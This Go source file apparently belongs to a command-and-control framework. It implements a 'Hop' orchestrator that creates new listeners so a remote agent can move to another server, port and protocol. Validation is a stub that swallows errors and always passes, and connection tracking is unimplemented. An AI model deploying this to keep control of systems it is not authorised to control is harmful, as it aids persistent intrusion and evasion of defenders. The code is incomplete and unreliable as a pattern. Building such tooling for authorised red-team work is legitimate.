package orchestration

import (
	"encoding/json"
	"fmt"
	"log"
	"numinon_shadow/internal/agent/config"
	"numinon_shadow/internal/listener"
	"numinon_shadow/internal/models"
	"numinon_shadow/internal/taskmanager"
)

// HopOrchestrator handles the Hop command lifecycle
type HopOrchestrator struct {
	listenerManager *listener.Manager
}

// NewHopOrchestrator creates a new Hop orchestrator with listener management capability
func NewHopOrchestrator(listenerManager *listener.Manager) *HopOrchestrator {
	return &HopOrchestrator{
		listenerManager: listenerManager,
	}
}

// PrepareTask sets up Hop-specific metadata and creates new listener
func (h *HopOrchestrator) PrepareTask(task *taskmanager.Task) error {
	// Check if we have listener management capability
	if h.listenerManager == nil {
		return fmt.Errorf("HOP command not supported: listener manager not configured")
	}

	// Validate arguments first
	if err := h.ValidateArgs(task.Arguments); err != nil {
		return fmt.Errorf("invalid Hop arguments: %w", err)
	}

	// Parse the hop arguments to get new connection details
	var hopArgs models.HopArgs
	if err := json.Unmarshal(task.Arguments, &hopArgs); err != nil {
		return fmt.Errorf("failed to parse hop arguments: %w", err)
	}

	// Map agent protocol to listener type
	listenerType := mapProtocolToListenerType(hopArgs.NewProtocol)

	// Create the new listener for the agent to connect to
	listenerID, err := h.listenerManager.CreateListener(
		listenerType,
		hopArgs.NewServerIP,
		hopArgs.NewServerPort,
	)
	if err != nil {
		return fmt.Errorf("failed to create new listener for hop: %w", err)
	}

	// Store listener ID in task metadata for cleanup later
	task.Metadata["new_listener_id"] = listenerID
	task.Metadata["old_protocol"] = getCurrentProtocolForAgent(task.AgentID) // You'll need to track this

	log.Printf("|🐇 HOP PREP| Created listener %s for agent %s hop to %s:%s",
		listenerID, task.AgentID, hopArgs.NewServerIP, hopArgs.NewServerPort)

	return nil
}

// ProcessResult handles the Hop results and cleans up old listener
func (h *HopOrchestrator) ProcessResult(task *taskmanager.Task, result json.RawMessage) error {
	// Parse agent result
	var agentResult models.AgentTaskResult
	if err := json.Unmarshal(result, &agentResult); err != nil {
		return fmt.Errorf("failed to parse result: %w", err)
	}

	// Check if hop was successful
	if agentResult.Status != models.StatusSuccessHopInitiated {
		// Hop failed - clean up the new listener we created
		if listenerID, ok := task.Metadata["new_listener_id"].(string); ok {
			if err := h.listenerManager.StopListener(listenerID); err != nil {
				log.Printf("|❗WARN HOP| Failed to clean up unused listener %s: %v",
					listenerID, err)
			}
		}
		return fmt.Errorf("hop failed: %s", agentResult.Error)
	}

	// Hop succeeded - stop old listener if needed
	// We'll need to track which listener each agent is using
	// This might require extending your agent tracking system

	log.Printf("|✅ HOP RESULT| Agent %s successfully initiated hop", task.AgentID)

	// In a real implementation, we'd wait for the agent to actually connect
	// to the new listener before stopping the old one. This might involve:
	// - Tracking agent connections by listener
	// - Having a grace period
	// - Confirming the new connection is established

	return nil
}

// Helper function to map agent protocol to listener type
func mapProtocolToListenerType(p config.AgentProtocol) listener.ListenerType {
	switch p {
	case config.HTTP1Clear:
		return listener.TypeHTTP1Clear
	case config.HTTP1TLS:
		return listener.TypeHTTP1TLS
	case config.HTTP2TLS:
		return listener.TypeHTTP2TLS
	case config.HTTP3:
		return listener.TypeHTTP3
	case config.WebsocketClear:
		return listener.TypeWebsocketClear
	case config.WebsocketSecure:
		return listener.TypeWebsocketSecure
	default:
		return listener.TypeHTTP1Clear // Default fallback
	}
}

// TODO: Implement agent connection tracking
func getCurrentProtocolForAgent(agentID string) string {
	// This would query your agent tracking system
	return "unknown"
}

// ValidateArgs checks if Hop arguments are valid
func (h *HopOrchestrator) ValidateArgs(args json.RawMessage) error {

	var hopArgs models.HopArgs

	if err := json.Unmarshal(args, &hopArgs); err != nil {
	}

	// TODO add our validation arguments

	return nil
}
